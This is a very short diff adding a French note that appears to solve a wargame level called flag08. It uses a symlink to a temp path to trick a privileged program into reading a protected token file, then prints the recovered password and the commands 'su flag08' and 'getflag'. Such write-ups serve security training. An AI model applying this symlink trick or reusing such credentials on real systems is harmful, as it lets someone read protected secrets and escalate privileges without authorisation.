@@ -1,0 +1,6 @@
+creer lien symbolique entre token et un fichier temporaire
+ln -s ~/token /tmp/test
+lancer l'executable sur /tmp/test
+quif5eloekouj29ke0vouxean
+su flag08
+getflag :)
